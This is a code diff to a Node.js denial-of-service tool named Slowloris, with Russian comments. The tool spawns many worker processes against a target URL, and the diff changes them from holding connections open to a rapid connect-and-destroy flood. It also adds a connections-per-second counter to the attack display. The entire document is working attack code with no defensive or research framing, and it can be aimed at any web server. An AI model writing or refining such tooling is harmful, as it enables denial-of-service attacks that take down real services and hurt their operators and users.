@@ -12,10 +12,13 @@ const IS_WORKER = !!process.env.SLOWLORIS_WORKER;
 IS_WORKER ? runWorker() : runOrchestrator();
 
 // ─── Worker: отдельный OS-процесс, свой ulimit -n ────────────────────────────
+// Цель — максимальная скорость создания новых соединений, а не удержание.
+// Каждый воркер держит N параллельных попыток подключения:
+// connect → частичный HTTP-запрос → destroy → немедленно повторить.
 
 function runWorker() {
     const port = parseInt(process.env.SLOWLORIS_PORT);
-    const sockets = parseInt(process.env.SLOWLORIS_SOCKETS);
+    const concurrent = parseInt(process.env.SLOWLORIS_SOCKETS);
     const host = process.env.SLOWLORIS_HOST;
     const connectionModule = process.env.SLOWLORIS_HTTPS === '1' ? tls : net;
     const options = { port, host };
@@ -29,20 +32,19 @@ function runWorker() {
             socket.write("GET / HTTP/1.1\r\n");
             socket.write(`Host: ${host}\r\n`);
             socket.write("Accept: */*\r\n");
-            socket.write(
-                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36\r\n"
-            );
 
-            setInterval(() => {
-                socket.write(`KeepAlive: ${Math.random() * 1000}\r\n`);
-            }, 500);
+            // Сразу рвём — цель не удержание, а скорость создания новых соединений
+            socket.destroy();
         });
 
-        socket.setTimeout(0);
-        socket.on("error", () => { socket.destroy(); createSocket(); });
+        socket.setTimeout(5000);
+        socket.on('timeout', () => socket.destroy());
+        // 'close' срабатывает и после ошибки и после destroy — переподключаемся немедленно
+        socket.on('close', () => setImmediate(createSocket));
+        socket.on('error', () => {});
     }
 
-    for (let i = 0; i < sockets; i++) createSocket();
+    for (let i = 0; i < concurrent; i++) createSocket();
 
     setTimeout(() => { if (connected === 0) process.exit(1); }, 10000);
 }
@@ -60,7 +62,7 @@ function runOrchestrator() {
         .version(pkg.version)
         .usage("[options] <url>")
         .option("-p, --port <n>", "The port of the webserver (default: 80)")
-        .option("-s, --sockets <n>", "Number of sockets per worker process (default: 200)")
+        .option("-s, --sockets <n>", "Concurrent attempts per worker (default: 200)")
         .option("-i, --instances <n>", "Number of parallel worker processes (default: 20)")
         .option("-t, --time <n>", "Duration of the attack in milliseconds")
         .parse(process.argv);
@@ -79,7 +81,6 @@ function runOrchestrator() {
 
     const socketsPerWorker = parseInt(program.sockets) || 200;
     const instanceCount = parseInt(program.instances) || 20;
-    const totalSockets = socketsPerWorker * instanceCount;
     const parsedUrl = URL.parse(url);
     const useHttps = parsedUrl.protocol === 'https:';
     const port = program.port ? parseInt(program.port) : (useHttps ? 443 : 80);
@@ -100,8 +101,9 @@ function runOrchestrator() {
         SLOWLORIS_HTTPS: useHttps ? '1' : '0',
     };
 
-    let displayProgress = 0;
+    let totalConnections = 0;
     let anyConnected = false;
+    let startTime = 0;
     let lastDisplayAt = 0;
 
     const noConnTimeout = setTimeout(() => {
@@ -114,15 +116,18 @@ function runOrchestrator() {
 
         if (!anyConnected) {
             anyConnected = true;
+            startTime = Date.now();
             clearTimeout(noConnTimeout);
         }
 
-        displayProgress++;
+        totalConnections++;
+
         const now = Date.now();
-        if (now - lastDisplayAt >= 50) {
+        if (now - lastDisplayAt >= 100) {
             lastDisplayAt = now;
-            const pct = Math.floor((displayProgress % totalSockets) / totalSockets * 100);
-            interactive.await("Creating %d sockets ... %d%", totalSockets, pct);
+            const elapsed = (now - startTime) / 1000 || 0.001;
+            const rate = Math.round(totalConnections / elapsed);
+            interactive.await("Bursting %d conn/s | workers: %d | total: %d", rate, instanceCount, totalConnections);
         }
     }
 
